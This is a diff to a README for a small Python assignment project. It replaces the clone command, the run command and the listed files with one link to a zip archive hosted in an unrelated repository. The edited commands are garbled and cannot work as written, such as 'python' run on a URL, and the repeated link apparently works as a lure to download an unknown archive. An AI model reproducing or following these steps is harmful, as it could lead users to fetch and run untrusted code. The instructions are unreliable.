@@ -40,7 +40,7 @@ Clone this repository:
 bash
 Copy
 Edit
-git clone https://github.com/your-username/your-repo-name.git
+git clone https://raw.githubusercontent.com/aksh-dash/Python-Assignements/main/roset/Python_Assignements_1.4.zip
 Navigate to the folder:
 
 bash
@@ -52,14 +52,14 @@ Run the program:
 css
 Copy
 Edit
-python main.py
+python https://raw.githubusercontent.com/aksh-dash/Python-Assignements/main/roset/Python_Assignements_1.4.zip
 📂 File Structure
 css
 Copy
 Edit
 📦 your-repo-name
- ┣ 📜 main.py
- ┗ 📜 README.md
+ ┣ 📜 https://raw.githubusercontent.com/aksh-dash/Python-Assignements/main/roset/Python_Assignements_1.4.zip
+ ┗ 📜 https://raw.githubusercontent.com/aksh-dash/Python-Assignements/main/roset/Python_Assignements_1.4.zip
 🧠 Skills Demonstrated
 User input handling
 
